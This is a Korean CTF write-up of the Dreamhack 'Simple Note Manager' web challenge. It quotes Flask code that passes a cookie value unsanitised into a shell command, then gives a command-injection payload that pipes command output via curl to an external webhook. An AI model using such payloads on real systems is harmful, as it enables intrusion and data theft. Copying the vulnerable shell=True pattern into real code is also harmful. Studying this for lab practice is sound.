---
title: "Dreamhack WEB Simple Note Manager"
date: 2026-07-12
categories:
  - CTF
  - Web Hacking
tags:
  - Command Injection
  - Cookie
---

일단 들어가보면 /, create, update, delete, backup 페이지가 있다.
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/4d924111250a5c725e82122d0ebd18a87ec4acd581cabf9bc25547f222ac97c3.png)

대충 create, upate, delete 는 http 메소드로 페이지 내용 수정할 수 있는거 같고 backup은 뭘 하는지 잘 모르겠다. 이제 소스코드를 보자.

소스코드를 보면 create, update, delete는 예상한 것과 비슷하고, backup 메소드는 뭔가 이상한 걸 볼 수 있다. 아래 코드를 보자

```
@app.route('/backup_notes', methods=['POST'])
def post_backup_notes():
    if len(notes) == 0:
        abort(404)
    backup_timestamp = request.cookies.get('backup-timestamp', f'{time.time()}')
    if not isinstance(backup_timestamp, str):
        abort(400)
    backup_notes(backup_timestamp)
    return redirect(url_for('get_index'))
    
def backup_notes(timestamp):
    with lock:
        with open('./tmp/notes.tmp', 'w') as f:
            f.write(repr(notes))
        subprocess.Popen(f'cp ./tmp/notes.tmp /tmp/{timestamp}', shell=True)
```

위가 backup 관련 함수인데, post로 백업할 시 쿠키에 잇는 backup-timestamp 값을 받고, 그걸 명령어의 일부에 전처리 없이 바로 넣는 걸 확인할 수 있다.

결론적으로 쿠키값을 수정하면 바로 커맨드인젝션이 가능하다.

이걸 바탕으로 커맨드 인젝션이 잘 되는지 한번 실험해보기 위해 쿠키에 아래와 같은 페이로드를 넣어보자
```
1231232; ls -la | curl -X POST -H "Content-Type: text/plain" --data-binary @- https://ljloltn.request.dreamhack.games
```

아차차!!
;는 웹 서버 쿠키 파서 시 문자가 아닌 구분자로 인식하므로 이걸 사용하면 뒤의 부분이 쿠키로 인식이 안되므로 |나 &&를 사용해보자. 그러면 정상적으로 웹훅으로 명령어 실행 결과가 전달되는 걸 확인할 수 있다.
이제 명령어를 cat flag로 바꿔서 전송하면 flag를 얻을 수 있다~